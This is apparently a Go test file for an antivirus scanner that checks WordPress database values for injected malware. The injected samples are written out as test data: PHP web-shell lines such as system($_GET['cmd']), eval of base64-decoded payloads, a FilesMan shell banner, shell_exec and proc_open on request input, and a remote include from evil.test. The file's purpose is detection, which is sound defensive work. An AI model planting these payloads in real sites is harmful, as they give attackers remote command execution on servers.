package antivirus

import (
	"strings"
	"testing"
)

// The corpus that decides the weights: option and post values a WORKING
// WordPress site really stores. Every one of these must produce NOTHING, or the
// scan reports a configured site as compromised.
var cleanDatabaseValues = map[string]string{
	"siteurl":                    "https://example.com",
	"active_plugins":             `a:3:{i:0;s:19:"akismet/akismet.php";i:1;s:27:"woocommerce/woocommerce.php";i:2;s:23:"wordpress-seo/wp-seo.php";}`,
	"a serialized widget":        `a:2:{s:5:"title";s:6:"Search";s:4:"text";s:33:"<p>Find what you are looking for</p>";}`,
	"an analytics snippet":       `<script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXX"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());</script>`,
	"a base64 logo":              `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==`,
	"a stored shortcode":         `[gallery ids="1,2,3" columns="3" link="file"]`,
	"a post about php":           `<p>To decode a string in PHP you can call base64_decode on it.</p>`,
	"a theme mod":                `a:1:{s:11:"custom_logo";i:42;}`,
	"a cron array":               `a:1:{i:1756000000;a:1:{s:16:"wp_version_check";a:1:{s:32:"40cd750bba9870f18aada2478b24840a";a:3:{s:8:"schedule";s:10:"twicedaily";s:4:"args";a:0:{}s:8:"interval";i:43200;}}}}`,
	"an embed":                   `<iframe src="https://player.vimeo.com/video/12345" width="640" height="360"></iframe>`,
	"a documented include":       `<p>Use include('header.php') at the top of the template.</p>`,
	"a URL in a redirect plugin": `a:1:{s:6:"source";s:24:"https://example.com/old/";}`,
}

// A working site produces nothing. This is the property that makes the rule set
// usable at all: a scan that reports a configured WordPress installation is a
// scan nobody will look at twice.
func TestCleanDatabaseValuesProduceNoFinding(t *testing.T) {
	for name, value := range cleanDatabaseValues {
		if _, ok := weighRow("wp_options", "option", 1, name, value); ok {
			matches := evaluateDatabaseValue(value)
			score, signature, _, level := verdict(matches, 0)
			t.Errorf("%s was reported as %s (%d, %s)", name, level, score, signature)
		}
	}
}

// The shapes this exists to catch. Each is a real injection pattern.
func TestInjectedDatabaseValuesAreReported(t *testing.T) {
	for name, sample := range map[string]struct {
		value string
		level string
	}{
		"eval of a decoded payload": {
			`eval(base64_decode('c3lzdGVtKCRfR0VUWyJjIl0pOw=='));`, LevelCritical},
		"a request reaching a shell": {
			`<?php system($_GET['cmd']); ?>`, LevelCritical},
		"an injected script that decodes itself": {
			`<script>eval(atob('YWxlcnQoMSk='))</script>`, LevelCritical},
		"a file manager shell banner": {
			`$auth_pass="";$color="#00ff00";$default_action="FilesMan";`, LevelCritical},
		"assert on request data": {
			`assert($_POST['x']);`, LevelCritical},
		"two independent moderate signals": {
			`$x = base64_decode($y); file_put_contents($p, $x);`, LevelSuspicious},
	} {
		finding, ok := weighRow("wp_options", "option", 190, name, sample.value)
		if !ok {
			t.Errorf("%s produced no finding", name)
			continue
		}
		if finding.Level != sample.level {
			t.Errorf("%s came back %s, want %s (score %d, %s)",
				name, finding.Level, sample.level, finding.Score, finding.Rules)
		}
		if finding.Engine != EngineDatabase {
			t.Errorf("%s carries engine %q", name, finding.Engine)
		}
	}
}

// A single moderate signal is not a finding. A page builder storing a PHP
// snippet and a theme storing a script are each exactly one, and reporting
// either would report a working site.
func TestOneModerateSignalIsNotAFinding(t *testing.T) {
	for _, value := range []string{
		`$data = base64_decode($stored);`,
		`file_put_contents($cache, $html);`,
		`<script>document.title = "hello";</script>`,
	} {
		if finding, ok := weighRow("wp_options", "option", 1, "x", value); ok {
			t.Errorf("%q alone was reported as %s (%d)", value, finding.Level, finding.Score)
		}
	}
}

// The entropy, taint and concealed-name passes were calibrated on PHP SOURCE.
// A serialized option value is a different distribution, so running them here
// would invent findings on working sites.
func TestOnlyThePatternPassRunsOnADatabaseValue(t *testing.T) {
	// A long base64 blob is exactly what the entropy rule fires on in a PHP
	// file, and exactly what a plugin legitimately stores in an option.
	blob := "a:1:{s:4:\"data\";s:600:\"" + strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5", 12) + "\";}"
	if finding, ok := weighRow("wp_options", "option", 1, "cache", blob); ok {
		t.Errorf("a stored base64 blob was reported as %s (%s)", finding.Level, finding.Rules)
	}
}

// A value larger than the limit is still weighed on its head rather than
// skipped: a skipped value is not a value that came back clean.
func TestALargeValueIsStillWeighed(t *testing.T) {
	payload := `eval(base64_decode('x'));`
	value := payload + strings.Repeat("a", dbValueLimit*2)
	if _, ok := weighRow("wp_options", "option", 1, "big", value); !ok {
		t.Error("a payload at the head of an oversized value was not reported")
	}
	if len(clampValue(value)) != dbValueLimit {
		t.Errorf("clampValue returned %d bytes, want %d", len(clampValue(value)), dbValueLimit)
	}
}

// Every rule must match something, or it is a pattern nobody has seen fire.
func TestEveryDatabaseRuleMatchesSomething(t *testing.T) {
	samples := []string{
		`eval(base64_decode('x'));`,
		`assert($_GET['a']);`,
		`shell_exec($_POST['c']);`,
		`preg_replace('/x/e', $c, $s);`,
		`<script>eval(atob('x'))</script>`,
		`$default_action="FilesMan";`,
		`eval($code);`,
		`create_function('', $body);`,
		`gzinflate($blob);`,
		`proc_open($cmd, $d, $p);`,
		`move_uploaded_file($a, $b);`,
		`include('https://evil.test/x.txt');`,
	}
	for _, r := range dbHeuristics {
		fired := false
		for _, sample := range samples {
			if r.re.MatchString(sample) {
				fired = true
				break
			}
		}
		if !fired {
			t.Errorf("%s matches none of the samples, so it is a pattern nobody has seen fire", r.name)
		}
	}
}

// The row description reaches a log line and a screen. A tenant names their own
// options, so the characters that break either are removed.
func TestARowDescriptionCarriesNoLineBreak(t *testing.T) {
	described := describeRow("wp_options", "option", 190, "name\r\nsmtpd_recipient_restrictions=permit\x00")
	if strings.ContainsAny(described, "\r\n\x00") {
		t.Errorf("the description carries a line break or a NUL: %q", described)
	}
	if !strings.Contains(described, "wp_options #190") {
		t.Errorf("the description lost the table and row: %q", described)
	}
	// It also fits the column, which is 512 characters.
	long := describeRow("wp_options", "option", 1, strings.Repeat("x", 4000))
	if len(long) > 512 {
		t.Errorf("the description is %d characters, over the column width", len(long))
	}
}

// A post is described by its table and id alone. The title is a tenant string
// that adds nothing an operator needs to find the row, and the option name is
// the only case where the name IS the address of the value.
func TestAPostIsNamedByItsRowAlone(t *testing.T) {
	if got := describeRow("wp_posts", "post", 42, "Hello world"); got != "wp_posts #42" {
		t.Errorf("describeRow for a post = %q, want wp_posts #42", got)
	}
}
